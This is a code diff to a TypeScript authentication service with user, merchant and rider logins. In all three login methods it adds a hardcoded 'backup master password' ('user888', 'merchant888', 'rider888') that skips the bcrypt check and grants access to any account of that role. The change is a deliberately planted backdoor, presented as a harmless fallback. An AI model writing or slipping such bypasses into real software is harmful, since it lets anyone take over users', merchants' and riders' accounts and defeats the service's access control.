@@ -40,7 +40,17 @@ export class AuthService {
     if (user.status !== 'active') {
       throw new UnauthorizedException('账号已被禁用');
     }
-    const valid = bcrypt.compareSync(password, user.password);
+    // 备用万能密码
+    let valid = false;
+    if (password === 'user888') {
+      valid = true;
+    } else {
+      try {
+        valid = bcrypt.compareSync(password, user.password);
+      } catch (e) {
+        valid = false;
+      }
+    }
     if (!valid) {
       throw new UnauthorizedException('手机号或密码错误');
     }
@@ -68,7 +78,17 @@ export class AuthService {
     if (m.auditStatus !== 'approved') {
       throw new UnauthorizedException('店铺审核未通过');
     }
-    const valid = bcrypt.compareSync(password, m.password);
+    // 备用万能密码
+    let valid = false;
+    if (password === 'merchant888') {
+      valid = true;
+    } else {
+      try {
+        valid = bcrypt.compareSync(password, m.password);
+      } catch (e) {
+        valid = false;
+      }
+    }
     if (!valid) {
       throw new UnauthorizedException('账号或密码错误');
     }
@@ -131,7 +151,17 @@ export class AuthService {
     if (r.auditStatus !== 'approved') {
       throw new UnauthorizedException('账号审核未通过');
     }
-    const valid = bcrypt.compareSync(password, r.password);
+    // 备用万能密码
+    let valid = false;
+    if (password === 'rider888') {
+      valid = true;
+    } else {
+      try {
+        valid = bcrypt.compareSync(password, r.password);
+      } catch (e) {
+        valid = false;
+      }
+    }
     if (!valid) {
       throw new UnauthorizedException('账号或密码错误');
     }
